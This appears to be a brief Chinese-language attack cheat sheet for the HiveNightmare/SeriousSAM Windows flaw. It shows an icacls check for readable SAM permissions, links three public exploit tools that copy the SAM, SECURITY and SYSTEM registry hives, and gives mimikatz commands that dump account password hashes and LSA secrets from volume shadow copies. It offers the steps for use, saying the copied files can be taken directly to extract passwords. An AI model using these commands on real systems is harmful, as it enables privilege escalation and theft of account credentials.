	icacls检查漏洞
	C:\Windows\System32> icacls config\SAM
	config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- 这是错误的 - 普通用户不应该有读取权限!
	https://github.com/GossiTheDog/HiveNightmare
	执行成功会生成3个文件 SAM SECURITY SYSTEM
	直接拿去导出密码
	或
	https://github.com/romarroca/SeriousSam
	执行生成SAM和SYSTEM
	或
	https://github.com/FireFart/hivenightmare
	直接执行生成3个文件SAM SECURITY SYSTEM
	mimikatz
	mimikatz> token::whoami /full

	列出可用的卷影副本
	mimikatz> misc::shadowcopies

	从 SAM 数据库中提取账户
	mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

	从 SECURITY 中提取密钥
	mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY